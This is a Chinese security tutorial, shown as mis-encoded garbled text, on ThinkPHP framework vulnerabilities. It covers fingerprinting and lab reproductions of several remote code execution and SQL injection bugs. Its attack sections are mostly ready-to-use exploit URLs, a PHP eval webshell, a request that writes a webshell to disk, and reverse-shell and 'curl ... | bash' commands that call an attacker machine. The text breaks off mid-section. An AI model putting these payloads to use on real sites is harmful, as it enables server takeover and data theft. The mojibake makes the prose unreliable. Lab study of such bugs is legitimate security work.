#  æŒæ¡thinkphpå…¨æ¼æ´(è¶…è¯¦ç»†çœ‹å®Œæ‹¿ætp)æ–‡æœ«å¸¦å·¥å…· | å¹²è´§   
 æ¸—é€å®‰å…¨å›¢é˜Ÿ   2023-11-25 10:10  
  
**æ–‡ç« ç›®å½•**  
<table><tbody style="outline: 0px;visibility: visible;"><tr style="outline: 0px;visibility: visible;"><td width="129.33333333333334" valign="top" style="outline: 0px;word-break: break-all;hyphens: auto;border-color: rgb(76, 76, 76);visibility: visible;">æ¡†æ¶ä»‹ç»<br style="outline: 0px;visibility: visible;"/></td><td width="369" valign="top" style="outline: 0px;word-break: break-all;hyphens: auto;border-color: rgb(76, 76, 76);visibility: visible;">ä½•ä¸ºthinkphp,åœ¨å“ªä¼šé‡åˆ°<span style="letter-spacing: 0.578px;text-wrap: wrap;">thinkphp</span></td></tr><tr style="outline: 0px;visibility: visible;"><td width="129.33333333333334" valign="top" style="outline: 0px;word-break: break-all;hyphens: auto;border-color: rgb(76, 76, 76);visibility: visible;">è¯†åˆ«spring<br style="outline: 0px;visibility: visible;"/></td><td width="369" valign="top" style="outline: 0px;word-break: break-all;hyphens: auto;border-color: rgb(76, 76, 76);visibility: visible;">å¦‚ä½•åœ¨å®æˆ˜ä¸­å¿«é€Ÿåˆ†è¾¨<span style="letter-spacing: 0.578px;text-wrap: wrap;">thinkphp</span>æ¡†æ¶<br style="outline: 0px;visibility: visible;"/></td></tr><tr style="outline: 0px;visibility: visible;"><td width="129.33333333333334" valign="top" style="outline: 0px;word-break: break-all;hyphens: auto;border-color: rgb(76, 76, 76);visibility: visible;">æ¼æ´åˆ—è¡¨<br style="outline: 0px;visibility: visible;"/></td><td width="369" valign="top" style="outline: 0px;word-break: break-all;hyphens: auto;border-color: rgb(76, 76, 76);visibility: visible;"><span style="letter-spacing: 0.578px;text-wrap: wrap;">thinkphp</span>æ¼æ´å…¨ç‰ˆæœ¬<br style="outline: 0px;visibility: visible;"/></td></tr><tr style="outline: 0px;visibility: visible;"><td width="129.33333333333334" valign="top" style="outline: 0px;word-break: break-all;hyphens: auto;border-color: rgb(76, 76, 76);visibility: visible;">æ¼æ´ç¯å¢ƒæ­å»º<br style="outline: 0px;visibility: visible;"/></td><td width="369" valign="top" style="outline: 0px;word-break: break-all;hyphens: auto;border-color: rgb(76, 76, 76);visibility: visible;">vulhub+vulfocus(è§ä¸Šä¸€ç¯‡spring)<br style="outline: 0px;visibility: visible;"/></td></tr><tr style="outline: 0px;visibility: visible;"><td valign="top" colspan="1" rowspan="1" width="109.33333333333334" style="outline: 0px;word-break: break-all;hyphens: auto;border-color: rgb(76, 76, 76);visibility: visible;">æ¼æ´å¤ç°<br style="outline: 0px;visibility: visible;"/></td><td valign="top" colspan="1" rowspan="1" width="82" style="outline: 0px;word-break: break-all;hyphens: auto;border-color: rgb(76, 76, 76);visibility: visible;">1.å¦‚ä½•è¯†åˆ«å½“å‰ç«™ç‚¹æ˜¯å¦å­˜åœ¨æ¼æ´</td></tr><tr style="outline: 0px;visibility: visible;"><td valign="top" colspan="1" rowspan="1" width="109.33333333333334" style="outline: 0px;word-break: break-all;hyphens: auto;border-color: rgb(76, 76, 76);visibility: visible;"><br/></td><td valign="top" colspan="1" rowspan="1" width="82" style="outline: 0px;word-break: break-all;hyphens: auto;border-color: rgb(76, 76, 76);visibility: visible;">2.å“ªäº›ç‰ˆæœ¬(æƒ…å†µ)å­˜åœ¨è¯¥æ¼æ´<br style="outline: 0px;visibility: visible;"/></td></tr><tr style="outline: 0px;visibility: visible;"><td valign="top" colspan="1" rowspan="1" width="109.33333333333334" style="outline: 0px;word-break: break-all;hyphens: auto;border-color: rgb(76, 76, 76);visibility: visible;"><br/></td><td valign="top" colspan="1" rowspan="1" width="82" style="outline: 0px;word-break: break-all;hyphens: auto;border-color: rgb(76, 76, 76);visibility: visible;">3.æ¼æ´æŒ‡çº¹ç‰¹å¾â­<br style="outline: 0px;visibility: visible;"/></td></tr><tr style="outline: 0px;visibility: visible;"><td valign="top" colspan="1" rowspan="1" width="109.33333333333334" style="outline: 0px;word-break: break-all;hyphens: auto;border-color: rgb(76, 76, 76);visibility: visible;"><br/></td><td valign="top" colspan="1" rowspan="1" width="82" style="outline: 0px;word-break: break-all;hyphens: auto;border-color: rgb(76, 76, 76);visibility: visible;">4.å¦‚ä½•å¤ç°<br style="outline: 0px;visibility: visible;"/></td></tr><tr style="outline: 0px;visibility: visible;"><td valign="top" colspan="1" rowspan="1" style="outline: 0px;word-break: break-all;hyphens: auto;border-color: rgb(76, 76, 76);visibility: visible;"><br/></td><td valign="top" colspan="1" rowspan="1" style="outline: 0px;word-break: break-all;hyphens: auto;border-color: rgb(76, 76, 76);visibility: visible;">5.å¦‚ä½•å®ç°è‡ªåŠ¨åŒ–<br style="outline: 0px;visibility: visible;"/></td></tr><tr style="outline: 0px;visibility: visible;"><td valign="top" colspan="1" rowspan="1" style="outline: 0px;word-break: break-all;hyphens: auto;border-color: rgb(76, 76, 76);visibility: visible;">å·¥å…·<br style="outline: 0px;"/></td><td valign="top" colspan="1" rowspan="1" style="outline: 0px;word-break: break-all;hyphens: auto;border-color: rgb(76, 76, 76);">1.æŒ‡çº¹è¯†åˆ«å·¥å…·<br style="outline: 0px;"/></td></tr><tr style="outline: 0px;"><td valign="top" colspan="1" rowspan="1" style="outline: 0px;word-break: break-all;hyphens: auto;border-color: rgb(76, 76, 76);"><br/></td><td valign="top" colspan="1" rowspan="1" style="outline: 0px;word-break: break-all;hyphens: auto;border-color: rgb(76, 76, 76);"><p style="outline: 0px;">2.ç»¼åˆåˆ©ç”¨å·¥å…·</p></td></tr></tbody></table>  
**é›¶-thinkphpçš„å‰ä¸–ä»Šç”Ÿ**  
  
ThinkPHPæ˜¯ä¸€ä¸ªå¿«é€Ÿã€å…¼å®¹è€Œä¸”ç®€å•çš„è½»é‡çº§å›½äº§PHPå¼€å‘æ¡†æ¶ï¼Œè¯ç”Ÿäº2006å¹´åˆï¼ŒåŸåFCSï¼Œ2007å¹´å…ƒæ—¦æ­£å¼æ›´åä¸ºThinkPHPï¼Œéµå¾ªApache2å¼€æºåè®®å‘å¸ƒï¼Œä»Strutsç»“æ„ç§»æ¤è¿‡æ¥å¹¶åšäº†æ”¹è¿›å’Œå®Œå–„ï¼ŒåŒæ—¶ä¹Ÿå€Ÿé‰´äº†å›½å¤–å¾ˆå¤šä¼˜ç§€çš„æ¡†æ¶å’Œæ¨¡å¼ï¼Œä½¿ç”¨é¢å‘å¯¹è±¡çš„å¼€å‘ç»“æ„å’ŒMVCæ¨¡å¼ï¼Œèåˆäº†Strutsçš„æ€æƒ³å’ŒTagLibï¼ˆæ ‡ç­¾åº“ï¼‰ã€RoRçš„ORMæ˜ å°„å’ŒActiveRecordæ¨¡å¼ã€‚  
  
ã€€ã€€ThinkPHPå¯ä»¥æ”¯æŒwindows/Unix/Linuxç­‰æœåŠ¡å™¨ç¯å¢ƒï¼Œæ­£å¼ç‰ˆéœ€è¦PHP5.0ä»¥ä¸Šç‰ˆæœ¬æ”¯æŒï¼Œæ”¯æŒMySqlã€PgSQLã€Sqliteå¤šç§æ•°æ®åº“ä»¥åŠPDOæ‰©å±•ï¼ŒThinkPHPæ¡†æ¶æœ¬èº«æ²¡æœ‰ä»€ä¹ˆç‰¹åˆ«æ¨¡å—è¦æ±‚ï¼Œå…·ä½“çš„åº”ç”¨ç³»ç»Ÿè¿è¡Œç¯å¢ƒè¦æ±‚è§†å¼€å‘æ‰€æ¶‰åŠçš„æ¨¡å—ã€‚  
  
ã€€ã€€ä½œä¸ºä¸€ä¸ªæ•´ä½“å¼€å‘è§£å†³æ–¹æ¡ˆï¼ŒThinkPHPèƒ½å¤Ÿè§£å†³åº”ç”¨å¼€å‘ä¸­çš„å¤§å¤šæ•°éœ€è¦ï¼Œå› ä¸ºå…¶è‡ªèº«åŒ…å«äº†åº•å±‚æ¶æ„ã€å…¼å®¹å¤„ç†ã€åŸºç±»åº“ã€æ•°æ®åº“è®¿é—®å±‚ã€æ¨¡æ¿å¼•æ“ã€ç¼“å­˜æœºåˆ¶ã€æ’ä»¶æœºåˆ¶ã€è§’è‰²è®¤è¯ã€è¡¨å•å¤„ç†ç­‰å¸¸ç”¨çš„ç»„ä»¶ï¼Œå¹¶ä¸”å¯¹äºè·¨ç‰ˆæœ¬ã€è·¨å¹³å°å’Œè·¨æ•°æ®åº“ç§»æ¤éƒ½æ¯”è¾ƒæ–¹ä¾¿ã€‚å¹¶ä¸”æ¯ä¸ªç»„ä»¶éƒ½æ˜¯ç²¾å¿ƒè®¾è®¡å’Œå®Œå–„çš„ï¼Œåº”ç”¨å¼€å‘è¿‡ç¨‹ä»…ä»…éœ€è¦å…³æ³¨ä¸šåŠ¡é€»è¾‘ã€‚  
  
**æ€»ç»“ä¸€ä¸‹:**  
å›½äººå¼€å‘çš„æ¡†æ¶,ä¸Šæ‰‹ç®€å•,å¼€å‘æˆæœ¬ä½,æ­å»ºå®¹æ˜“  
  
æ‰€ä»¥,tpæ¡†æ¶å¸¸è§äºä¸€äº›è¿æ³•ç½‘ç«™ä¸Šé¢  
  
tpç‰ˆæœ¬ä¿¡æ¯  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5up6TPpuCn3NNwS5LDO7MqCOnpOvuM6gEZPQHlWzvMjvFdRwbyjRUCUUshjkLOH9PzP6wWnzibZdXag/640?wx_fmt=png "")  
  
æ–‡æ¡£ä¸­å¿ƒ Â· ThinkPHPÂ Â Â Â è¿™æ˜¯tpçš„å®˜æ–¹æ–‡æ¡£,åŒ…å«äº†æ¡†æ¶ä¸€äº›åŸºæœ¬çŸ¥è¯†,ä¸€äº›å¿…è¦çš„çŸ¥è¯†æˆ‘ä¼šåœ¨å¤ç°è¿‡ç¨‹ä¸­ä¸€ä¸€è®²è§£,ä¸è¿‡è¿˜æ˜¯å»ºè®®è‡ªå·±å»çœ‹ä¸€ä¸‹æ–‡æ¡£  
  
**ä¸€-è¯†åˆ«tpæ¡†æ¶(æŒ‡çº¹)**  
  
1.1 iocåˆ¤æ–­  
  
/favicon.ico  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5up6TPpuCn3NNwS5LDO7MqCOlBozc7FI10qknBONibo52JVicLibnsicMhM27zZTVEksEhLk8CSpUFTALw/640?wx_fmt=png "")  
  
1.2  
æŠ¥é”™  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5up6TPpuCn3NNwS5LDO7MqCOlnvzgJrNB2RP93CXdaRzia5Jbj6RPgoxVdJCwv0iaYWzibCxFzia6hrJjw/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5up6TPpuCn3NNwS5LDO7MqCOcbphsY7k80N1PO9m7xY6ZnjFDmQhsTOgGTWmGKkyJ3BlPkgm5wRaeQ/640?wx_fmt=png "")  
  
1.3é”™è¯¯ä¼ å‚  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5up6TPpuCn3NNwS5LDO7MqCO0soH2SJLpyiaicM4J6c7wzibOlAOiaAtkPK0EklBZOygahlWmNTq1Kw4tg/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uribSwIWP3w8uLzee8xc9v3eC30YNehkkDzkdlOEnwHBzvAY13vToIAoI9nDSWibruicjVlN71Lvx8Cg/640?wx_fmt=png "")  
  
1.4ç‰¹æ®ŠæŒ‡çº¹å‡ºç°logo  
  
/?c=4e5e5d7364f443e28fbf0d3ae744a59a  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5up6TPpuCn3NNwS5LDO7MqCOv5JNOVclfibrrDSEdZIJK3ElotnxXsJheibbge3XjhJbPibV8l1ibiaPicwg/640?wx_fmt=png "")  
  
/4e5e5d7364f443e28fbf0d3ae744a59a  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5up6TPpuCn3NNwS5LDO7MqCOhkbJ2iaY5Pl3P3hWu66cFsquRmcJm4ljYv20ZZ9d5cfgu536ooBEzmA/640?wx_fmt=png "")  
  
p3.1å’Œ3.2ç‰ˆæœ¬  
  
4e5e5d7364f443e28fbf0d3ae744a59a-index.html  
  
1.5 bodyç‰¹å¾  
  
bodyé‡Œæœ‰"åå¹´ç£¨ä¸€å‰‘" æˆ–è€…"ThinkPHP"  
  
1.6æ’ä»¶  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5up6TPpuCn3NNwS5LDO7MqCOe0Sxjic5PPD1P6u2lCMicfWVZ6pFcEC73lZ0eVWibNiaeia0nvFTx0xHqYw/640?wx_fmt=png "")  
  
**äºŒ-æ¼æ´åˆ—è¡¨**  
<table><tbody><tr><td width="269" valign="top" style="word-break: break-all;"><h1 style="letter-spacing: 0.578px;text-wrap: wrap;">ThinkPHP 2.x ä»»æ„ä»£ç æ‰§è¡Œæ¼æ´</h1></td></tr><tr><td width="269" valign="top" style="word-break: break-all;"><h2>ThinkPHP5 5.0.22/5.1.29 è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´(5-rce)</h2></td></tr><tr><td width="269" valign="top" style="word-break: break-all;"><h2>ThinkPHP5 SQLæ³¨å…¥æ¼æ´ &amp; æ•æ„Ÿä¿¡æ¯æ³„éœ²</h2></td></tr><tr><td width="269" valign="top" style="word-break: break-all;"><h2>ThinkPHP 5.0.23 è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</h2></td></tr><tr><td width="269" valign="top" style="word-break: break-all;">ThinkPHP3.2.x RCE</td></tr><tr><td width="269" valign="top" style="word-break: break-all;">thinkphp lang å‘½ä»¤æ‰§è¡Œ</td></tr></tbody></table>  
# ThinkPHP 2.x ä»»æ„ä»£ç æ‰§è¡Œæ¼æ´  
#   
  
  
**1 æ¼æ´åŸç†**  
  
ThinkPHP 2.xç‰ˆæœ¬ä¸­ï¼Œä½¿ç”¨  
preg_replaceçš„  
/eæ¨¡å¼åŒ¹é…è·¯ç”±ï¼š  
```
$res = preg_replace('@(\w+)'.$depr.'([^'.$depr.'\/]+)@e', '$var[\'\\1\']="\\2";', implode($depr,$paths));
```  
  
å¯¼è‡´ç”¨æˆ·çš„è¾“å…¥å‚æ•°è¢«æ’å…¥åŒå¼•å·ä¸­æ‰§è¡Œï¼Œé€ æˆä»»æ„ä»£ç æ‰§è¡Œæ¼æ´ã€‚  
  
ThinkPHP 3.0ç‰ˆæœ¬å› ä¸ºLiteæ¨¡å¼ä¸‹æ²¡æœ‰ä¿®å¤è¯¥æ¼æ´ï¼Œä¹Ÿå­˜åœ¨è¿™ä¸ªæ¼æ´ã€‚  
  
ä»€ä¹ˆæ˜¯  
preg_replace å‡½æ•°  
  
è¿™ä¸ªå‡½æ•°æ˜¯ä¸ªæ›¿æ¢å‡½æ•°ï¼Œè€Œä¸”æ”¯æŒæ­£åˆ™ï¼Œä½¿ç”¨æ–¹å¼å¦‚ä¸‹ï¼š  
```
```  
```
preg_replace('æ­£åˆ™è§„åˆ™','æ›¿æ¢å­—ç¬¦','ç›®æ ‡å­—ç¬¦')
```  
```
```  
```
```  
  
è¿™ä¸ªå‡½æ•°çš„3ä¸ªå‚æ•°ï¼Œç»“åˆèµ·æ¥çš„æ„æ€æ˜¯ï¼šå¦‚æœç›®æ ‡å­—ç¬¦å­˜åœ¨ç¬¦åˆæ­£åˆ™è§„åˆ™çš„å­—ç¬¦ï¼Œé‚£ä¹ˆå°±æ›¿æ¢ä¸ºæ›¿æ¢å­—ç¬¦ï¼Œå¦‚æœæ­¤æ—¶æ­£åˆ™è§„åˆ™ä¸­ä½¿ç”¨äº†/e  
è¿™ä¸ªä¿®é¥°ç¬¦ï¼Œåˆ™å­˜åœ¨ä»£ç æ‰§è¡Œæ¼æ´ã€‚  
  
ä¸‹é¢æ˜¯æœç´¢åˆ°çš„å…³äº/e  
çš„è§£é‡Šï¼š  
```
```  
```
```  
```
```  
  
åªè¦åœ¨â€œjust testâ€ä¸­åŒ¹é…åˆ°äº†â€œtestâ€å­—ç¬¦ï¼Œå°±æ‰§è¡Œä¸­é—´çš„print_rè¿™æ¡å‡½æ•°çš„å‘½ä»¤ã€‚  
  
**2Â å½±å“ç‰ˆæœ¬**  
  
2.x  
  
3.0  
  
**3.å¤ç°**  
  
è§¦å‘æ¡ä»¶æ˜¯php<=5.6.29  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uoKDn47vnMSPA4lc6HHaGf0c5rk9cwswuYC3GLiaxQtP1NjfaAeQuHcaQ5nJtSzJKQvicudrU7wuNIQ/640?wx_fmt=png "")  
  
è®¿é—®  
/index.php?s=/index/index/name/$%7B@phpinfo()%7D  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uoKDn47vnMSPA4lc6HHaGf0wjD7icDBuzFXGwj9Lmjg366Kdpa9BatNTmdc3xKibaRfgK4XYuPMVJQQ/640?wx_fmt=png "")  
# ä¹‹é—´æ”¹æˆ$%7Bsystem(whoami)%7D  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uoKDn47vnMSPA4lc6HHaGf0AIhI7EtMEybM7gh2wpBYNQAdh9EYt2XyahFgicIUdhiafyG0Ikbp2r1A/640?wx_fmt=png "")  
#   
# ä¸€å¥è¯  
  
$  
{ Â    
@  
print  
(  
eval  
(  
$_POST  
[  
1  
]))}  
  
åå¼¹shell  
  
å…ˆåœ¨æ”»å‡»æœºå†™ä¸€ä¸ªshæ–‡ä»¶,é‡Œé¢æ”¾  
  
bash -i >& /dev/tcp/192.168.233.131/7777 0>&1  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uoKDn47vnMSPA4lc6HHaGf0G5YGic6QWQb0gtktWUPrlRNd5awRSF5QQGZccYtF5HaR9yFjnSHEB4A/640?wx_fmt=png "")  
  
æ”»å‡»æœºå¼€å¯webæœåŠ¡  
  
python -m SimpleHTTPServer 80  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uoKDn47vnMSPA4lc6HHaGf0aNicfVqv7JPoib4qbzhHibFRXzcXKpAx95DoZ0bBdEPSHviaRRIyq755zA/640?wx_fmt=png "")  
  
ç„¶åç”¨é©¬å­å»æ‰§è¡Œè¿™ä¸ªshæ–‡ä»¶çš„å‘½ä»¤  
  
1=system("curl http://192.168.233.131/shell.shÂ  | bash");  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uoKDn47vnMSPA4lc6HHaGf0DIbexObSXCFDRRznShVn3zHQwa1ErMsG8VwIbwUMv244q38gTMgdmg/640?wx_fmt=png "")  
  
äº¦æˆ–è€…ç›´æ¥é©¬å­æ‰§è¡Œåå¼¹shellå‘½ä»¤  
```
1=system%28%22bash+-c+'bash+-i+>%26+%2Fdev%2Ftcp%2F192.168.233.131%2F8888+0>%261'%22%29%3B
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uoKDn47vnMSPA4lc6HHaGf0DXt6R1KHM5iaN5tYwe5iaps6ose9ibFJRQWZIrCKvYaIqK8C47Hm2ntfg/640?wx_fmt=png "")  
  
okç»“æŸ,docker-compose downä¸‹ä¸€å…³  
  
å¯¹äº†,è¿™é‡Œæˆ‘æƒ³å’Œå°ç™½è¯´å‡ å¥è¯,æ¼æ´å¤ç°ç¡®å®æ˜¯ä¸€ä¸ªå¾ˆæ¯ç‡¥çš„è¿‡ç¨‹,ä½†æ˜¯åªæœ‰å¤ç°å®Œç†è§£å®Œæ‰èƒ½æœ‰å¯èƒ½æŒæ¡è¿™äº›æ¼æ´,æ‰èƒ½æœ‰å¯èƒ½åœ¨å®æˆ˜ä¸­è®¤å‡ºè¿™ä¸ªæ´,å¿…ä¸å¯å°‘çš„ä¸€ä¸ªè¿‡ç¨‹,éº‹é¹¿å¸Œæœ›è¯»è€…èƒ½é™ä¸‹å¿ƒæ¥,å»æŒ‰ç…§æˆ‘ä»¬çš„æ–‡ç« ä¸€ä¸ªä¸€ä¸ªå¤ç°ä¸€è¾¹,æœ€åè‡ªå·±ä¹Ÿå†™ä¸€ä¸ªè¿‡ç¨‹å½“ä½œç¬”è®°,æ”¶é›†ä¸€ä¸ªæŒ‡çº¹è¡¨åšä¸ºè‡ªå·±çš„å‚è€ƒ.æ­£å¦‚éº‹é¹¿ä¸»é¡µè¯´æ‰€,  
ä¸ç®¡æ˜¯å¯¹äºé«˜è€ƒè¿™äº›åº”è¯•è€ƒè¯•,è¿˜æ˜¯å­¦ä¹ æŠ€æœ¯,å­¦ä¹ æœ¬å°±æ˜¯ä¸€åœºä¿®è¡Œ,å°±æ˜¯ç”¨æ¥ç‚¼å¿ƒçš„,ç”¨æ¥å…‹æœæ‡’æƒ°å’Œå¿ƒçŒ¿æ„é©¬çš„.  
  
## ThinkPHP5 5.0.22/5.1.29 è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´(5-rce)  
##   
  
  
**1 æ¼æ´åŸç†**  
  
ç”±äºæ¡†æ¶é”™è¯¯åœ°å¤„ç†äº†æ§åˆ¶å™¨åç§°ï¼Œå› æ­¤å¦‚æœç½‘ç«™æœªå¯ç”¨å¼ºåˆ¶è·¯ç”±ï¼ˆé»˜è®¤è®¾ç½®ï¼‰ï¼Œåˆ™è¯¥æ¡†æ¶å¯ä»¥æ‰§è¡Œä»»ä½•æ–¹æ³•ï¼Œä»è€Œå¯¼è‡´RCEæ¼æ´ã€‚  
  
**2 å½±å“ç‰ˆæœ¬**  
  
5.0.22/5.1.29  
  
**3 å¤ç°**  
  
è§¦å‘åœ°å€æ˜¯  
```
/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=shell.php&vars[1][]=+urlç¼–ç åçš„é©¬å­
```  
  
å¯¹   
<?php phpinfo(); eval(@$_POST['cmd']); ?>è¿›è¡Œç¼–ç ç„¶åæ‹¼æ¥  
```
http://192.168.233.131:8080/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=milu.php&vars[1][]=%3C%3Fphp%20phpinfo()%3B%20eval(%40%24_POST[%27cmd%27])%3B%20%3F%3E
```  
  
â€  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uoKDn47vnMSPA4lc6HHaGf0RfR2MI8MX5ibcBBxfRjZOlH1eDWT4qbjABva57jTZH43F6hq5sCW5ZQ/640?wx_fmt=png "")  
  
è®¿é—®milu.php  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uoKDn47vnMSPA4lc6HHaGf0cPtIzQ1iaYo84o9bzws5icviaoCkVBgX2FyfFY9EoFOhlXfkPMZqydt5w/640?wx_fmt=png "")  
  
åé¢åå¼¹shellè¿™äº›å’Œå‰é¢ä¸€æ ·![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uoKDn47vnMSPA4lc6HHaGf0YVibgxwxV6avOcfN5WOJGcKPNyt2GYIdczWDDSM1TaJBSibOZTKILtcg/640?wx_fmt=png "")  
  
## ThinkPHP5 SQLæ³¨å…¥æ¼æ´ & æ•æ„Ÿä¿¡æ¯æ³„éœ²  
  
****# 1 æ¼æ´åŸç†  
  
  
ä¼ å…¥çš„æŸå‚æ•°åœ¨ç»‘å®šç¼–è¯‘æŒ‡ä»¤çš„æ—¶å€™åˆæ²¡æœ‰å®‰å…¨å¤„ç†ï¼Œé¢„ç¼–è¯‘çš„æ—¶å€™å¯¼è‡´SQLå¼‚å¸¸æŠ¥é”™ã€‚ç„¶è€Œthinkphp5é»˜è®¤å¼€å¯debugæ¨¡å¼ï¼Œåœ¨æ¼æ´ç¯å¢ƒä¸‹æ„é€ é”™è¯¯çš„SQLè¯­æ³•ä¼šæ³„æ¼æ•°æ®åº“è´¦æˆ·å’Œå¯†ç ã€‚  
  
è¿™é‡Œå…·ä½“è®²ä¸€ä¸‹æ¼æ´äº§ç”Ÿçš„è¿‡ç¨‹å§  
  
æ¼æ´é™„è¿‘ä»£ç å¦‚ä¸‹  
```
<?php
namespace app\index\controller;

use app\index\model\User;

class Index
{
    public function index()
{
        $ids = input('ids/a');
        $t = new User();
        $result = $t->where('id', 'in', $ids)->select();
    }
}
```  
  
è¿™é‡Œå¦‚æœinå¯æ§çš„è¯ï¼Œé€šè¿‡ç”¨æˆ·ä¼ å…¥ï¼Œé‚£ä¹ˆå°±ä¼šé€ æˆæ³¨å…¥ï¼Œè®©æˆ‘ä»¬æ¥åˆ†æä¸€ä¸‹inçš„æ“ä½œä»£ç ï¼š  
```
<?php
...
$bindName = $bindName ?: 'where_' . str_replace(['.', '-'], '_', $field);
if (preg_match('/\W/', $bindName)) {
    // å¤„ç†å¸¦éå•è¯å­—ç¬¦çš„å­—æ®µå
    $bindName = md5($bindName);
}
...
} elseif (in_array($exp, ['NOT IN', 'IN'])) {
    // IN æŸ¥è¯¢
    if ($value instanceof \Closure) {
        $whereStr .= $key . ' ' . $exp . ' ' . $this->parseClosure($value);
    } else {
        $value = is_array($value) ? $value : explode(',', $value);
        if (array_key_exists($field, $binds)) {
            $bind  = [];
            $array = [];
            foreach ($value as $k => $v) {
                if ($this->query->isBind($bindName . '_in_' . $k)) {
                    $bindKey = $bindName . '_in_' . uniqid() . '_' . $k;
                } else {
                    $bindKey = $bindName . '_in_' . $k;
                }
                $bind[$bindKey] = [$v, $bindType];
                $array[]        = ':' . $bindKey;
            }
            $this->query->bind($bind);
            $zone = implode(',', $array);
        } else {
            $zone = implode(',', $this->parseValue($value, $field));
        }
        $whereStr .= $key . ' ' . $exp . ' (' . (empty($zone) ? "''" : $zone) . ')';
    }

```  
  
ä»£ç å…ˆå¯¹  
$bindName  
Â å…ˆè¿›è¡Œäº†ä¸€æ¬¡æ£€æµ‹ï¼Œé˜²æ­¢äº†ä¸€äº›æ³¨å…¥æƒ…å†µï¼Œä½†æ˜¯æˆ‘ä»¬çœ‹åˆ°$valueæ˜¯ä¸€ä¸ªæ•°ç»„çš„æƒ…å†µä¸‹ï¼Œä¼šéå†  
$value  
ï¼Œå¹¶å°†  
$k  
æ‹¼æ¥è¿›  
$bingName  
ã€‚  
  
ä»‹ç»ä¸€ä¸‹PDOé¢„ç¼–è¯‘çš„è¿‡ç¨‹  
  
1.Â prepare($SQL) ç¼–è¯‘SQLè¯­å¥  
  
2.Â bindValue($param, $value) å°†valueç»‘å®šåˆ°paramçš„ä½ç½®ä¸Š  
  
3.Â execute() æ‰§è¡Œ  
  
è¿™ä¸ªæ¼æ´å®é™…ä¸Šå°±æ˜¯æ§åˆ¶äº†ç¬¬äºŒæ­¥çš„$paramå˜é‡ï¼Œè¿™ä¸ªå˜é‡å¦‚æœæ˜¯ä¸€ä¸ªSQLè¯­å¥çš„è¯ï¼Œé‚£ä¹ˆåœ¨ç¬¬äºŒæ­¥çš„æ—¶å€™æ˜¯ä¼šæŠ›å‡ºé”™è¯¯çš„,è¿”å›æ‰§è¡Œçš„æ¶æ„è¯­å¥ç»“æœ  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uribSwIWP3w8uLzee8xc9v3eGQCpceYUyibgAd5RQoDsxDBKYsklyWZ88BzhdrvUibheDWub0DmsVaTg/640?wx_fmt=png "")  
  
**2Â å½±å“ç‰ˆæœ¬**  
  
ThinkPHP < 5.1.23  
  
**3 å¤ç°**  
  
è¿™é‡Œç¯å¢ƒè¦ç”¨åˆ°80ç«¯å£,è®°å¾—å…³äº†ä¹‹å‰çš„webç¯å¢ƒ(åå¼¹shellæ—¶)  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uoKDn47vnMSPA4lc6HHaGf0ic541AZWwTorfrw4e1pE4OqwUaSL4avy8qVicuqglM3h7G5EQHibugK1w/640?wx_fmt=png "")  
  
è®¿é—®  
/index.php?ids[]=1&ids[]=2  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uribSwIWP3w8uLzee8xc9v3epiaKApLtoogCRTzgCec10sichQotu6TTe6FAUwgtricSjyKgRSkVM6n6g/640?wx_fmt=png "")  
  
/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uribSwIWP3w8uLzee8xc9v3eGQCpceYUyibgAd5RQoDsxDBKYsklyWZ88BzhdrvUibheDWub0DmsVaTg/640?wx_fmt=png "")  
  
  
**ThinkPHP 5.0.23Â è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´**  
  
# 1 æ¼æ´åŸç†  
  
å…¶ç‰ˆæœ¬5ä¸­ï¼Œç”±äºæ²¡æœ‰æ­£ç¡®å¤„ç†æ§åˆ¶å™¨åï¼Œå¯¼è‡´åœ¨ç½‘ç«™æ²¡æœ‰å¼€å¯å¼ºåˆ¶è·¯ç”±çš„æƒ…å†µä¸‹ï¼ˆå³é»˜è®¤æƒ…å†µä¸‹ï¼‰å¯ä»¥æ‰§è¡Œä»»æ„æ–¹æ³•ï¼Œä»è€Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚  
  
**2 ç‰ˆæœ¬**  
  
ThinkPHP 5.0.x < 5.0.23 ThinkPHP 5.1.x < 5.1.31  
  
**3 å¤ç°**  
```
t&server[REQUEST_METHOD]=whoami
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uribSwIWP3w8uLzee8xc9v3e4W9jRHwAoYPe67d8DW0wzeC1jyWjxEjdojMdIn2mXKRkNg6zibWfMJg/640?wx_fmt=png "")  
# å†™shell  
  
å…ˆpwdä¸€ä¸‹  
  
